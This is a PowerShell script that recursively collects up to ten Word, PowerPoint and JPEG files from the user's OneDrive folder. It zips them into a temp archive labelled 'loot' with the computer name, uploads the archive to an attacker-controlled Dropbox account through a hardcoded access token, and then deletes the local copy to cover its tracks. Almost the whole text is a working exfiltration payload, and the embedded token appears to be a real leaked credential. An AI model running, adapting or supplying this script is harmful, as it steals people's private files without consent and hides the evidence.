function Upload-DropBox() {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [string]$SourceFilePath
    ) 
    $dropBoxAccessToken = "sl.BncSjV5TnWvZSpXMdWvXkBDo31itBLe1bi3j_2Pv1nJ-gaO6cOYykmYtSgot4fJiQt3pXkKU446JxEOJ7tc4d067QHaQM-7CewjulXhrYCHqOo5oeE1CXq_ntydyAUg1Be2CN4Pg82d57O4"   # Replace with your DropBox Access Token
    $outputFile = Split-Path $SourceFilePath -leaf
    $targetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $dropBoxAccessToken
    $authHeaders = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $authHeaders.Add("Authorization", $authorization)
    $authHeaders.Add("Dropbox-API-Arg", $arg)
    $authHeaders.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $authHeaders
}

$computerName = $env:COMPUTERNAME

if (Test-Path $env:OneDrive) {
    $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot-$computerName.zip" -Update
}

if (Test-Path "$env:TEMP\imabdk-loot-$computerName.zip") {
    Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot-$computerName.zip"
    Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
}
